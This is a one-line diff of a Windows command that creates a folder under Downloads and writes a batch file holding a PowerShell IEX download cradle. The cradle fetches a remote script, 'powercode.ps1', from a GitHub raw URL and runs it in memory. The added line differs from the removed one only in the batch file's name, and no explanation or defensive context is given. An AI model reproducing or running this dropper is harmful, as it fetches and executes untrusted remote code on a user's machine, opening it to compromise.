@@ -1,1 +1,1 @@
-md C:\Users\User\Downloads\ser; echo IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/powercode.ps1').GetResponse().GetResponseStream()).ReadToEnd()); >C:\Users\User\Downloads\ser\c.bat;
+md C:\Users\User\Downloads\ser; echo IEX([System.IO.StreamReader]::New([System.Net.WebRequest]::Create('https://raw.githubusercontent.com/alejq41/free/main/powercode.ps1').GetResponse().GetResponseStream()).ReadToEnd()); >C:\Users\User\Downloads\ser\seru.bat;
